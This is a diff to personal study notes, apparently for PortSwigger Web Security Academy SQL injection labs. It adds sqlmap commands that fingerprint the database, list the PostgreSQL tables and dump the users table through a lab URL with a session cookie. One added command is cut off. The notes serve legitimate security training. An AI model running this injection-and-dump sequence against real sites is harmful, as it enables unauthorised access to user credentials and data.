@@ -15,9 +15,13 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 5. SQL injection attack, listing the database contents on non-Oracle databases
 
-Database engine detection:
 
-sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhdEO55lTgCCAdhnWOzwG" --batch  
+case:
+sqlmap -u "https://0a4b009904f25e948465aef8007300cd.web-security-academy.net/filter?category=Gifts" --cookie="session=etWQ5Ql297sJYh0a3cOl7V4H5BWSXyx1o" --batch --random-agent --risk=3 --level=3
+sqlmap -u "https://0a4b009904f25e948465aef8007300cd.web-security-academy.net/filter?category=Gifts" --cookie="session=etWQ5Ql297sJYh0a3cOl7V4H5BWSXyx1o" --batch --random-agent --risk=3 --level=3 --fingerprint
+sqlmap -u "https://0a4b009904f25e948465aef8007300cd.web-security-academy.net/filter?category=Gifts" --cookie="session=etWQ5Ql297sJYh0a3cOl7V4H5BWSXyx1o" --batch --random-agent --risk=3 --level=3 --dbms=PostgreSQL -D public --tables
+sqlmap -u "https://0a4b009904f25e948465aef8007300cd.web-security-academy.net/filter?category=Gifts" --cookie="session=etWQ5Ql297sJYh0a3cOl7V4H5BWSXyx1o" --batch --random-agent --risk=3 --level=3 --dbms=PostgreSQL -D public -T users --dump
+  
 
 
 
@@ -28,6 +32,10 @@ Lepiej zacząć od --dbs, a --schema używać rzadko
 sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhdEO55lTgCCAdhnWOzwG" --batch --dbms=PostgreSQL --schema
 
 
+sqlmap -u "https://0a4b009904f25e948465aef8007300cd.web-security-academy.net/filter?category=Gifts" --cookie="session=etWQ5Ql297sJYh0a3cOl7V4H5BWSXyx1o" --batch --random-agent --risk=3 --level=3 --dbms=PostgreSQL -D public -
+
+
+ 
 
 User and Passowrd table display
 
